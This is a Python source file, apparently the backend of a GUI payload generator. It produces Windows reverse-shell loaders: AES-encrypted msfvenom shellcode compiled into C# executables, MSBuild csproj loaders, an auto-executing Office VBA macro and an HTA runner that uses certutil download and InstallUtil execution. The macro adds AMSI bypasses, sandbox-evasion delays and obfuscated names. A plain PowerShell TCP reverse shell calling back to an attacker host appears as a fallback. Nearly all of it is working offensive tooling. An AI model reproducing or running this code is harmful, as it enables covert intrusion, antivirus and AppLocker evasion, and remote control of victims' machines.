import os, re, subprocess, base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# --- SHELLCODE GENERATION BACKEND ---
def generate_shellcode_backend(selected_format, arch, payload, connection, interface, port, template):
    if not port.isdigit():
        raise ValueError("Invalid port number.")

    command = f"msfvenom -p windows/{'x64/' if arch == 'x64' else ''}{payload}/reverse_{connection} LHOST={interface} LPORT={port} -f {selected_format}"
    print(f"[DEBUG] Executing msfvenom command: {command}")
    
    result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
    print(f"[DEBUG] Msfvenom output length: {len(result)} characters")

    if selected_format == "csharp":
        print("[DEBUG] Processing C# shellcode format...")
        shellcode_data = [line.strip() for line in result.split("\n") if "0x" in line]
        shellcode_bytes = re.findall(r"0x[0-9a-fA-F]+", "\n".join(shellcode_data))
        print(f"[DEBUG] Extracted {len(shellcode_bytes)} shellcode bytes")
        shellcode_formatted = ", ".join(shellcode_bytes)
        shellcode_only = [f"{x}" for x in shellcode_bytes]
        shellcode_only = ",\n".join(", ".join(shellcode_only[i:i+8]) for i in range(0, len(shellcode_only), 8))
        print(f"[DEBUG] Formatted shellcode length: {len(shellcode_formatted)} characters")
    else:
        raise ValueError("Unsupported format selected.")

    wrapped_shellcode = f"byte[] buf = new byte[] {{\n        {shellcode_formatted}\n    }};"
    directives = "\n".join(template.get("directives", []))
    function_decls = "\n    ".join(template.get("function_declarations", []))
    code_blocks = template.get("code_blocks", {})

    all_code_lines = []
    for key, block in code_blocks.items():
        all_code_lines.append(f"    // --- {key.replace('_', ' ').title()} ---")
        all_code_lines.extend(f"    {line}" for line in block)
        all_code_lines.append("")

    main_code = "\n".join(all_code_lines).replace("PLACEHOLDER_SHELLCODE", wrapped_shellcode)
    constant_decls = "\n    ".join(template.get("constant_declarations", []))

    main_signature = "static void Main()"
    if any("args[0]" in line or "args.Length" in line for block in code_blocks.values() for line in block):
        main_signature = "static void Main(string[] args)"

    final_script = f"""
{directives}
class Program
{{
    {function_decls}
    {constant_decls}
    {main_signature}
    {{
{main_code}
    }}
}}
"""
    return final_script.strip(), shellcode_only, wrapped_shellcode

# --- FINAL SCRIPT BUILDER ---
def build_final_script(template, shellcode=None, aes_data=None):
    print(f"[DEBUG] build_final_script called for regular technique")
    print(f"[DEBUG] Shellcode length: {len(shellcode) if shellcode else 0}")

    # --- AES ENCRYPTION (auto) ---
    if aes_data is None and shellcode:
        try:
            print("[DEBUG] Starting AES encryption of shellcode...")
            raw_bytes = bytes(int(x, 16) for x in re.findall(r"0x[0-9a-fA-F]+", shellcode))
            key = os.urandom(16)
            iv = os.urandom(16)
            cipher = AES.new(key, AES.MODE_CBC, iv)
            encrypted = cipher.encrypt(pad(raw_bytes, AES.block_size))
            aes_data = {
                "b64_shellcode": base64.b64encode(encrypted).decode(),
                "b64_key": base64.b64encode(key).decode(),
                "b64_iv": base64.b64encode(iv).decode()
            }
            print(f"[DEBUG] AES encryption completed. Raw bytes: {len(raw_bytes)}, Encrypted: {len(aes_data['b64_shellcode'])}")
        except Exception as e:
            print(f"[DEBUG] AES encryption failed: {e}")
            raise ValueError(f"Failed to encrypt shellcode: {e}")

    # --- BUILDING TEMPLATE ---
    directives = "\n".join(template.get("directives", []))
    function_decls = "\n    ".join(template.get("function_declarations", []))
    constants = "\n    ".join(template.get("constant_declarations", []))
    definitions = "\n    ".join(template.get("function_definitions", [])) if "function_definitions" in template else ""

    code_blocks = template.get("code_blocks", {})
    code_lines = []

    for key, block in code_blocks.items():
        code_lines.append(f"    // --- {key.replace('_', ' ').title()} ---")
        code_lines.extend(f"    {line}" for line in block)
        code_lines.append("")

    code = "\n".join(code_lines)

    # Inject AES values or fallback to plain shellcode
    if aes_data:
        print(f"[DEBUG] Injecting AES values into template...")
        print(f"[DEBUG] Encrypted shellcode length: {len(aes_data['b64_shellcode'])}")
        code = code.replace("ENCRYPTED_SHELLCODE_B64", aes_data["b64_shellcode"])
        code = code.replace("AES_KEY_B64", aes_data["b64_key"])
        code = code.replace("AES_IV_B64", aes_data["b64_iv"])
        print("[DEBUG] AES values injected successfully")
    elif shellcode:
        print("[DEBUG] Using plain shellcode (no AES encryption)")
        code = code.replace("PLACEHOLDER_SHELLCODE", shellcode)

    main_signature = "static void Main()"
    if any("args" in line for block in code_blocks.values() for line in block):
        main_signature = "static void Main(string[] args)"

    final_script = f"""
    {directives}

    class Program
    {{
        {function_decls}
        {constants}
        {main_signature}
        {{
    {code}
        }}
        {definitions}
    }}"""

    return final_script.strip()

# --- EXE BUILDER ---
def build_exe_from_output(app):
    full_output = app.output_text.get("1.0", "end").strip()
    if not full_output:
        app.output_text.configure(state="normal")
        app.output_text.insert("end", "\n[!] No code to build.\n")
        app.output_text.configure(state="disabled")
        return

    technique = app.selected_technique.get().lower().replace(" ", "_")
    fmt = "csharp"  # Default format since we removed the format dropdown
    arch = app.architecture.get().lower()
    payload = app.payload_type.get().lower()
    connection = app.selected_connection.get().lower()
    interface = app.selected_interface.get().lower().replace("/", "_")
    port = app.port.get()

    # Check if AppLocker bypass is enabled and append to filename
    applocker_suffix = ""
    if hasattr(app, 'applocker_var') and app.applocker_var.get():
        applocker_suffix = "_applocker"

    # Handle VBA Macro - no file building needed, just copy to clipboard
    if technique == "vbamacro":
        # VBA Macro is handled by copy button, no file building required
        pass
    # Handle CSProj files differently
    elif technique == "csproj_bypass":
        filename = f"{technique}_{connection}_{interface}_{port}{applocker_suffix}.csproj"
        try:
            build_csproj_file(full_output, filename)
            app.top_status_label.config(text="CSProj Built!", foreground="#00ff00")
            app.bottom_status_label.config(text="see output", foreground="#00ff00")
            app.flicker_widget(app.top_status_label, "#00ff00", "#2e2e2e", final_color="#00ff00")
            app.open_folder_button.pack(pady=5, padx=10, anchor="se")
            app.flicker_widget(app.open_folder_button, "#91ddd3", "#ec1c3a", final_color="#91ddd3")
        except Exception as e:
            app.top_status_label.config(text="Build failed", foreground="#ff5555")
            app.flicker_widget(app.top_status_label, "#ff0000", "#1f1f1f", steps=4, interval=60, final_color="#ec1c3a")
            print(f"CSProj build error: {e}")
    else:
        filename = f"{technique}_{fmt}_{arch}_{payload}_{connection}_{interface}_{port}{applocker_suffix}.exe"
        try:
            build_exe(full_output, filename, arch=arch)
            app.top_status_label.config(text="EXE Built!", foreground="#00ff00")
            app.bottom_status_label.config(text="see output", foreground="#00ff00")
            app.flicker_widget(app.top_status_label, "#00ff00", "#2e2e2e", final_color="#00ff00")
            app.open_folder_button.pack(pady=5, padx=10, anchor="se")
            app.flicker_widget(app.open_folder_button, "#91ddd3", "#ec1c3a", final_color="#91ddd3")
        except subprocess.CalledProcessError:
            app.top_status_label.config(text="Build failed", foreground="#ff5555")
            app.flicker_widget(app.top_status_label, "#ff0000", "#1f1f1f", steps=4, interval=60, final_color="#ec1c3a")

# --- C# EXE COMPILER ---
def build_exe(source_code, filename, output_dir="output", arch="x64"):
    os.makedirs(output_dir, exist_ok=True)
    source_path = os.path.join(output_dir, filename.replace(".exe", ".cs"))
    exe_path = os.path.join(output_dir, filename)

    with open(source_path, "w") as f:
        f.write(source_code)

    compile_cmd = f'mcs -out:"{exe_path}" -platform:{arch} -unsafe -target:exe -reference:System.dll,System.Core.dll,System.Security.dll,System.Configuration.Install.dll,System.Management.dll "{source_path}"'
    print(f"Running: {compile_cmd}")

    try:
        output = subprocess.check_output(compile_cmd, shell=True, stderr=subprocess.STDOUT, text=True)
        print("[+] Compilation Output:\n", output)
        return exe_path
    except subprocess.CalledProcessError as e:
        print("\n[!] Compiler Error Output:\n", e.output)
        raise e

# --- CSPROJ TEMPLATE BUILDER ---
def build_csproj_script(template, powershell_payload=None, aes_data=None, include_ping_delay=True):
    print(f"[DEBUG] build_csproj_script called with payload length: {len(powershell_payload) if powershell_payload else 0}")
    
    # --- AES ENCRYPTION for PowerShell payload ---
    if aes_data is None and powershell_payload:
        try:
            print("[DEBUG] Starting AES encryption of PowerShell payload...")
            raw_bytes = powershell_payload.encode('utf-8')
            key = os.urandom(16)
            iv = os.urandom(16)
            cipher = AES.new(key, AES.MODE_CBC, iv)
            encrypted = cipher.encrypt(pad(raw_bytes, AES.block_size))
            aes_data = {
                "b64_shellcode": base64.b64encode(encrypted).decode(),
                "b64_key": base64.b64encode(key).decode(),
                "b64_iv": base64.b64encode(iv).decode()
            }
            print(f"[DEBUG] AES encryption completed. Encrypted length: {len(aes_data['b64_shellcode'])}")
        except Exception as e:
            print(f"[DEBUG] AES encryption failed: {e}")
            raise ValueError(f"Failed to encrypt PowerShell payload: {e}")

    # --- BUILDING CSPROJ TEMPLATE ---
    template_content = template.get("template_content", [])
    ping_delay_block = template.get("ping_delay_block", [])
    
    # Join the template content
    csproj_content = "\n".join(template_content)
    
    # Add ping delay if requested
    if include_ping_delay:
        ping_delay_code = "\n".join(ping_delay_block)
        csproj_content = csproj_content.replace("PLACEHOLDER_PING_DELAY", ping_delay_code)
    else:
        csproj_content = csproj_content.replace("PLACEHOLDER_PING_DELAY", "")
    
    # Inject AES values if available
    if aes_data:
        print(f"[DEBUG] Injecting AES values into CSProj template...")
        print(f"[DEBUG] Encrypted payload length: {len(aes_data['b64_shellcode'])}")
        csproj_content = csproj_content.replace("ENCRYPTED_SHELLCODE_B64", aes_data["b64_shellcode"])
        csproj_content = csproj_content.replace("AES_KEY_B64", aes_data["b64_key"])
        csproj_content = csproj_content.replace("AES_IV_B64", aes_data["b64_iv"])
        print("[DEBUG] AES values injected successfully")
    else:
        print("[DEBUG] No AES data available for injection")
    
    return csproj_content

# --- CSPROJ FILE BUILDER ---
def build_csproj_file(source_content, filename, output_dir="output"):
    os.makedirs(output_dir, exist_ok=True)
    csproj_path = os.path.join(output_dir, filename)
    
    with open(csproj_path, "w") as f:
        f.write(source_content)
    
    print(f"[+] CSProj file created: {csproj_path}")
    return csproj_path

# --- VBA MACRO GENERATION FUNCTIONS ---
def generate_vba_macro(interface_name, port):
    """Generate VBA macro with Base64 reverse shell payload using template system"""
    import base64
    import psutil
    import random
    import string
    
    print(f"[DEBUG] Generating VBA macro for interface {interface_name}:{port}")
    
    # Load template data
    from core.template_loader import load_template_data
    templates = load_template_data()
    vba_template = templates.get("VBAMacro", {})
    template_structure = vba_template.get("template_structure", {})
    obfuscation_config = vba_template.get("obfuscation", {})
    
    print("[DEBUG] Using template-driven VBA generation")
    
    # Convert interface name to IP address
    def get_interface_ip(interface_name):
        try:
            addresses = psutil.net_if_addrs()
            if interface_name in addresses:
                for addr in addresses[interface_name]:
                    if addr.family == 2:  # AF_INET (IPv4)
                        return addr.address
            print(f"[!] Could not find IPv4 address for interface {interface_name}")
            return interface_name  # Fallback to interface name if IP not found
        except Exception as e:
            print(f"[!] Error getting IP for interface {interface_name}: {e}")
            return interface_name  # Fallback to interface name
    
    # Get the actual IP address from the interface
    ip = get_interface_ip(interface_name)
    print(f"[DEBUG] Resolved interface {interface_name} to IP {ip}")
    
    def generate_base64_payload(ip, port):
        # Use template-driven PowerShell payload
        ps_template = template_structure.get("powershell_template", "")
        ps_command = ps_template.format(IP=ip, PORT=port)
        print("[DEBUG] Generated PowerShell payload from template")

        ps_bytes = ps_command.encode('utf-16le')
        return base64.b64encode(ps_bytes).decode()

    def chunk_string(s, chunk_size=100):
        return [s[i:i+chunk_size] for i in range(0, len(s), chunk_size)]

    def generate_macro(base64_payload):
        base_cmd = "powershell -nop -w hidden -encodedCommand "
        full_command = base_cmd + base64_payload
        reversed_command = full_command[::-1]  # Reverse the string

        # Split into chunks for line-safe VBA
        chunks = chunk_string(reversed_command)
        formatted_chunks = '"' + '" & _\n               "'.join(chunks) + '"'

        # Enhanced AMSI bypass with multiple techniques
        # Use template-driven AMSI bypasses
        amsi_bypasses = template_structure.get("amsi_bypasses", {})
        amsi_primary = amsi_bypasses.get("primary_bypass", "")
        amsi_secondary = amsi_bypasses.get("secondary_bypass", "")
        print("[DEBUG] Using AMSI bypasses from template")

        # Format both bypasses for VBA
        line_chunk_size = obfuscation_config.get("line_chunk_size", 90)
        primary_chunks = chunk_string(amsi_primary, line_chunk_size)
        formatted_primary = '"' + '" & _\n           "'.join(primary_chunks) + '"'

        secondary_chunks = chunk_string(amsi_secondary, line_chunk_size)
        formatted_secondary = '"' + '" & _\n           "'.join(secondary_chunks) + '"'

        # Apply basic VBA obfuscation
        def obfuscate_vba_names():
            return {
                'main_func': ''.join(random.choices(string.ascii_letters, k=8)),
                'amsi_var1': ''.join(random.choices(string.ascii_letters, k=6)),
                'amsi_var2': ''.join(random.choices(string.ascii_letters, k=6)),
                'str_var': ''.join(random.choices(string.ascii_letters, k=7)),
                'decode_func': 'bears',  # Keep this for functionality
                'auto_func1': ''.join(random.choices(string.ascii_letters, k=10)),
                'auto_func2': ''.join(random.choices(string.ascii_letters, k=11)),
                'auto_func3': ''.join(random.choices(string.ascii_letters, k=12))
            }
        
        vba_names = obfuscate_vba_names()

        amsi_bypass = (
            f'    Dim {vba_names["amsi_var1"]} As String, {vba_names["amsi_var2"]} As String\n'
            f'    {vba_names["amsi_var1"]} = "powershell -nop -w hidden -c " & _\n           {formatted_primary}\n'
            f'    {vba_names["amsi_var2"]} = "powershell -nop -w hidden -c " & _\n           {formatted_secondary}\n'
            f'    CreateObject("WScript.Shell").Run {vba_names["amsi_var1"]}, 0, False\n'
            f'    CreateObject("WScript.Shell").Run {vba_names["amsi_var2"]}, 0, False\n'
        )

        # Update string variable name in the command line
        str_arg_line = f'{vba_names["str_var"]} = bears({formatted_chunks})'

        macro = f'''Function bears(cows)
    bears = StrReverse(cows)
End Function

' Universal sleep function that works in all Office applications
Sub SleepSeconds(seconds As Integer)
    Dim startTime As Date
    startTime = Now
    Do While DateDiff("s", startTime, Now) < seconds
        DoEvents
    Loop
End Sub

Sub {vba_names["main_func"]}()
    ' Connection info: {ip}:{port}
    ' Sleep for sandbox evasion
    Call SleepSeconds(3)
    
{amsi_bypass}    
    ' Brief delay between bypass and payload
    Call SleepSeconds(1)
    
    Dim {vba_names["str_var"]} As String
    {str_arg_line}
    GetObject(bears(":stmgmniw")).Get(bears("ssecorP_23niW")).Create {vba_names["str_var"]}, Null, Null, pid
End Sub

' Auto-execution functions for Word documents
Sub AutoOpen()
    {vba_names["main_func"]}
End Sub

Sub Document_Open()
    {vba_names["main_func"]}
End Sub

Sub AutoExec()
    {vba_names["main_func"]}
End Sub

' Auto-execution functions for Excel documents
Sub Workbook_Open()
    {vba_names["main_func"]}
End Sub

Sub Auto_Open()
    {vba_names["main_func"]}
End Sub

' Additional obfuscated auto-execution functions
Sub {vba_names["auto_func1"]}()
    {vba_names["main_func"]}
End Sub

Sub {vba_names["auto_func2"]}()
    {vba_names["main_func"]}
End Sub

Sub {vba_names["auto_func3"]}()
    {vba_names["main_func"]}
End Sub
'''
        return macro

    # Generate the components
    b64_payload = generate_base64_payload(ip, port)
    macro_code = generate_macro(b64_payload)
    
    print(f"[DEBUG] Generated VBA macro, length: {len(macro_code)} characters")
    return macro_code

# --- HTA RUNNER GENERATION FUNCTIONS ---
def generate_hta_runner(interface_name, port):
    """Generate advanced obfuscated HTA with certutil download and InstallUtil execution using template system"""
    import psutil
    
    print(f"[DEBUG] Generating HTA Runner for interface {interface_name}:{port}")
    
    # Load template data
    from core.template_loader import load_template_data
    templates = load_template_data()
    hta_template = templates.get("HTARunner", {})
    template_structure = hta_template.get("template_structure", {})
    
    print("[DEBUG] Using template-driven HTA generation")
    
    # Convert interface name to IP address
    def get_interface_ip(interface_name):
        try:
            addresses = psutil.net_if_addrs()
            if interface_name in addresses:
                for addr in addresses[interface_name]:
                    if addr.family == 2:  # AF_INET (IPv4)
                        return addr.address
            print(f"[!] Could not find IPv4 address for interface {interface_name}")
            return interface_name  # Fallback to interface name if IP not found
        except Exception as e:
            print(f"[!] Error getting IP for interface {interface_name}: {e}")
            return interface_name  # Fallback to interface name
    
    # Get the actual IP address from the interface
    ip = get_interface_ip(interface_name)
    print(f"[DEBUG] Resolved interface {interface_name} to IP {ip}")
    
    # Generate HTA using template data
    hta_content = generate_hta_from_template_data(template_structure, ip, port)
    
    print(f"[DEBUG] Generated HTA Runner, length: {len(hta_content)} characters")
    return hta_content

def generate_hta_from_template_data(template_structure, ip, port):
    """Generate HTA content using template data"""
    # Get template components
    obfuscation_mapping = template_structure.get("obfuscation_mapping", {})
    command_templates = template_structure.get("command_templates", {})
    javascript_template = template_structure.get("javascript_template", [])
    execution_stages = template_structure.get("execution_stages", [])
    html_wrapper = template_structure.get("html_wrapper", [])
    
    # Format command templates with IP and port
    formatted_commands = {}
    for key, template in command_templates.items():
        if "{IP}" in template or "{PORT}" in template:
            formatted_commands[key] = template.format(IP=ip, PORT=port)
        else:
            formatted_commands[key] = template
    
    # Build JavaScript content
    javascript_lines = []
    for line in javascript_template:
        if "{EXECUTION_STAGES}" in line:
            # Insert execution stages
            for stage_line in execution_stages:
                # Use safe replacement for execution stages that may have placeholders
                formatted_stage = stage_line
                formatted_stage = formatted_stage.replace("{IP}", ip)
                formatted_stage = formatted_stage.replace("{PORT}", port)
                formatted_stage = formatted_stage.replace("{WSCRIPT_SHELL}", formatted_commands.get("wscript_shell", ""))
                formatted_stage = formatted_stage.replace("{TARGET_PATH}", formatted_commands.get("target_path", ""))
                formatted_stage = formatted_stage.replace("{HTTP_PREFIX}", formatted_commands.get("http_prefix", ""))
                formatted_stage = formatted_stage.replace("{DECODE_COMMAND}", formatted_commands.get("decode_command", ""))
                formatted_stage = formatted_stage.replace("{INSTALLUTIL_COMMAND}", formatted_commands.get("installutil_command", ""))
                javascript_lines.append(formatted_stage)
        else:
            # Use safe replacement for template placeholders only
            formatted_line = line
            formatted_line = formatted_line.replace("{ALPHABET}", obfuscation_mapping.get("alphabet", ""))
            formatted_line = formatted_line.replace("{ROT_ALPHABET}", obfuscation_mapping.get("rot_alphabet", ""))
            formatted_line = formatted_line.replace("{NUMBERS}", obfuscation_mapping.get("numbers", ""))
            formatted_line = formatted_line.replace("{SYMBOLS}", obfuscation_mapping.get("symbols", ""))
            formatted_line = formatted_line.replace("{CERTUTIL_BASE}", formatted_commands.get("certutil_base", ""))
            javascript_lines.append(formatted_line)
    
    javascript_content = "\n".join(javascript_lines)
    
    # Build final HTML using wrapper template
    html_lines = []
    for line in html_wrapper:
        if "{JAVASCRIPT_CONTENT}" in line:
            html_lines.append(javascript_content)
        else:
            html_lines.append(line)
    
    return "\n".join(html_lines)

def generate_hta_from_template(interface_name, port, template_data=None):
    """Generate HTA runner using template data from Specialized.json"""
    import psutil
    
    print(f"[DEBUG] Generating HTA from template for {interface_name}:{port}")
    
    # Load template data if not provided
    if template_data is None:
        from core.template_loader import load_template_data
        templates = load_template_data()
        template_data = templates.get("HTARunner", {})
    
    template_structure = template_data.get("template_structure", {})
    
    # Convert interface name to IP address
    def get_interface_ip(interface_name):
        try:
            addresses = psutil.net_if_addrs()
            if interface_name in addresses:
                for addr in addresses[interface_name]:
                    if addr.family == 2:  # AF_INET (IPv4)
                        return addr.address
            print(f"[!] Could not find IPv4 address for interface {interface_name}")
            return interface_name
        except Exception as e:
            print(f"[!] Error getting IP for interface {interface_name}: {e}")
            return interface_name
    
    # Get the actual IP address from the interface
    ip = get_interface_ip(interface_name)
    print(f"[DEBUG] Resolved interface {interface_name} to IP {ip}")
    
    # Get obfuscation mapping from template
    obfuscation = template_structure.get("obfuscation_mapping", {})
    alphabet = obfuscation.get("alphabet", "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz")
    rot_alphabet = obfuscation.get("rot_alphabet", "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm")
    numbers = obfuscation.get("numbers", "0123456789")
    symbols = obfuscation.get("symbols", "/$:;-\\\\%#*&!. ")
    
    # Build obfuscation arrays for JavaScript
    alph_array = '["' + '","'.join(list(alphabet)) + '"]'
    ranalph_array = '["' + '","'.join(list(rot_alphabet)) + '"]'
    num_array = '["' + '","'.join(list(numbers)) + '"]'
    sym_array = '["' + '","'.join(list(symbols)) + '"]'
    
    # Get command templates
    command_templates = template_structure.get("command_templates", {})
    
    # Build JavaScript content using execution flow template
    execution_flow = template_structure.get("execution_flow", [])
    
    # Format the command templates with actual values
    formatted_commands = {}
    for key, template in command_templates.items():
        if key == "target_path":
            formatted_commands[key] = template.format(IP=ip, PORT=port)
        else:
            formatted_commands[key] = template
    
    # Build the JavaScript execution code
    javascript_lines = [
        f"    var alph = {alph_array.replace('\"', '\"')};",
        f"    var ranalph = {ranalph_array.replace('\"', '\"')};", 
        f"    var num = {num_array.replace('\"', '\"')};",
        f"    var sym = {sym_array.replace('\"', '\"')};",
        "",
        f"    var sample = \"{formatted_commands.get('certutil_base', '')}\";",
        "",
        "    var scram = function(sample) {",
        "        var result = \"\";",
        "        for (var x=0; x<sample.length; x++) {",
        "            for (var y=0; y<alph.length; y++) {",
        "                if (sample[x]==alph[y]) {",
        "                    result+=ranalph[y];",
        "                }",
        "            }",
        "            for (var s=0; s<sym.length; s++) {",
        "                if(sample[x]==sym[s]) {",
        "                    result+=sym[s];",
        "                }",
        "            }",
        "            for (var n=0; n<num.length; n++) {",
        "                if(sample[x]==num[n]) {",
        "                    result+=num[n];",
        "                }",
        "            }",
        "        }",
        "        return result;",
        "    };",
        ""
    ]
    
    # Add execution flow from template
    for line in execution_flow:
        formatted_line = line.format(
            WSCRIPT_SHELL=formatted_commands.get("wscript_shell", ""),
            TARGET_PATH=formatted_commands.get("target_path", ""),
            HTTP_PREFIX=formatted_commands.get("http_prefix", ""),
            DECODE_COMMAND=formatted_commands.get("decode_command", ""),
            INSTALLUTIL_COMMAND=formatted_commands.get("installutil_command", "")
        )
        javascript_lines.append(f"    {formatted_line}")
    
    javascript_content = "\n".join(javascript_lines)
    
    # Build final HTA using template wrapper
    html_wrapper = template_structure.get("html_wrapper", [])
    html_lines = []
    for line in html_wrapper:
        if "{JAVASCRIPT_CONTENT}" in line:
            html_lines.append(javascript_content)
        else:
            html_lines.append(line)
    
    hta_content = "\n".join(html_lines)
    
    print(f"[DEBUG] Generated HTA with {len(hta_content)} characters from template")
    return hta_content

# === SHELLCODE MANAGEMENT AND THREADING ===
import threading
import ttkbootstrap as tb

def generate_shellcode_threaded(app, update_status_fn):
    """Generate shellcode in a separate thread to keep the GUI responsive"""
    update_status_fn(app, enabled=False)
    app.start_glitch_animation()

    if app.marquee_job:
        app.root.after_cancel(app.marquee_job)
        app.marquee_job = None

    app.top_status_label.config(text="Shellcode")
    app.output_text.configure(state="normal")
    app.output_text.delete("1.0", tb.END)
    app.output_text.configure(state="disabled")

    thread = threading.Thread(
        target=threaded_shellcode_generate,
        args=(app, update_status_fn)
    )
    thread.start()

def threaded_shellcode_generate(app, update_status_fn):
    """Actual shellcode generation logic"""
    try:
        selected_format = "csharp"  # Default format for shellcode generation
        arch = app.architecture.get()
        payload = app.payload_type.get()
        connection = app.selected_connection.get()
        interface = app.selected_interface.get()
        port = app.port.get()
        template = app.get_selected_template()
        technique = app.selected_technique.get()

        print("Template:", template)
        print("Technique:", technique)

        # Check if this is a VBA Macro template
        if technique == "VBAMacro":
            print("[*] Generating VBA Macro with reverse shell payload...")
            final_script = generate_vba_macro(interface, port)
            print(f"[+] VBA Macro generated, length: {len(final_script)} characters")
            shellcode_only = f"VBA Macro for {interface}:{port}"
            
        # Check if this is an HTA Runner template
        elif technique == "HTARunner":
            print("[*] Generating HTA Runner with certutil download and InstallUtil execution...")
            final_script = generate_hta_runner(interface, port)
            print(f"[+] HTA Runner generated, length: {len(final_script)} characters")
            shellcode_only = f"HTA Runner for {interface}:{port}"
            
        # Check if this is a CSProj template
        elif technique == "csproj_bypass":
            print("[*] Generating PowerShell payload with msfvenom...")
            
            # Generate PowerShell payload using msfvenom
            msfvenom_cmd = f"msfvenom -p windows/{'x64/' if arch == 'x64' else ''}shell/reverse_{connection} LHOST={interface} LPORT={port} -f psh-reflection"
            
            try:
                result = subprocess.check_output(msfvenom_cmd, shell=True, stderr=subprocess.STDOUT, text=True)
                
                # Filter out msfvenom warning messages and extract only the PowerShell code
                lines = result.split('\n')
                powershell_lines = []
                in_payload = False
                
                for line in lines:
                    # Skip msfvenom status/warning messages
                    if line.startswith('[-]') or line.startswith('[*]') or line.startswith('[+]'):
                        continue
                    # Skip empty lines at the beginning
                    if not in_payload and line.strip() == '':
                        continue
                    # Start collecting payload when we see actual PowerShell code
                    if '$' in line or 'function' in line.lower() or 'param' in line.lower():
                        in_payload = True
                    
                    if in_payload:
                        powershell_lines.append(line)
                
                powershell_payload = '\n'.join(powershell_lines).strip()
                
                if not powershell_payload or len(powershell_payload) < 50:
                    raise Exception("Generated payload appears to be empty or too short")
                    
                print(f"[+] Generated PowerShell payload ({len(powershell_payload)} characters)")
                
            except Exception as e:
                print(f"[!] Error generating PowerShell payload: {e}")
                # Fallback to basic PowerShell reverse shell
                powershell_payload = f"""$client = New-Object System.Net.Sockets.TCPClient('{interface}',{port})
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{{0}}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}}
$client.Close()"""
            
            # Build the csproj script with AES encryption
            print("[*] Building CSProj script with AES encryption...")
            final_script = build_csproj_script(
                template=template,
                powershell_payload=powershell_payload.strip(),
                include_ping_delay=True
            )
            print(f"[+] CSProj script built, length: {len(final_script)} characters")
            shellcode_only = powershell_payload.strip()
            
        else:
            # Generate raw shellcode for regular templates
            print(f"[*] Generating {technique} shellcode using msfvenom...")
            print(f"[*] Architecture: {arch}, Payload: {payload}, Connection: {connection}")
            print(f"[*] Target: {interface}:{port}")
            
            _, shellcode_only, _ = generate_shellcode_backend(
                selected_format, arch, payload, connection, interface, port, template
            )

            print(f"[+] Generated shellcode ({len(shellcode_only)} characters)")
            print("[*] Building final script with AES encryption...")

            # Build final script with AES applied internally
            final_script = build_final_script(
                template=template,
                shellcode=shellcode_only
            )
            
            print(f"[+] Final script built, length: {len(final_script)} characters")

        print("Final script:", "None" if final_script is None else "Generated")

        msf_cmd = app.build_msfconsole_cmd()
        app.root.after(0, lambda: finish_shellcode_generate(app, final_script, shellcode_only, msf_cmd, update_status_fn))

    except Exception as e:
        app.root.after(0, lambda: app.output_text.insert(tb.END, f"\n[!] Error: {str(e)}"))
        app.root.after(0, lambda: update_status_fn(app, enabled=True))

def finish_shellcode_generate(app, script, shellcode_only, msf_cmd, update_status_fn):
    """Finalize the GUI updates after shellcode generation"""
    app.shellcode_only = shellcode_only
    app.original_shellcode = script
    app.full_msf_cmd = msf_cmd

    app.render_script(script)

    app.msf_entry.configure(
        state="normal",
        foreground="#000000",
        background="#FEFE00",
        insertbackground="#000000"
    )
    app.msf_entry.delete("1.0", tb.END)
    app.msf_entry.insert("1.0", msf_cmd)
    app.msf_entry.configure(state="disabled")

    app.copy_button.configure(state=tb.NORMAL)
    app.build_button.configure(state=tb.NORMAL)
    
    # Enable applocker checkbox after code is generated (only for shellcode techniques, not CSProj, VBAMacro, or HTARunner)
    if hasattr(app, 'applocker_checkbox'):
        technique = app.selected_technique.get()
        if technique not in ["csproj msbuild", "VBAMacro", "HTARunner"]:
            app.applocker_checkbox.configure(state=tb.NORMAL)

    app.start_marquee()
    app.loading_image_label.place_forget()
    app.stop_glitch_animation()

    update_status_fn(
        app,
        enabled=True,
        top_text="Shellcode",
        bottom_text="Generated",
        color="#00ff00"
    )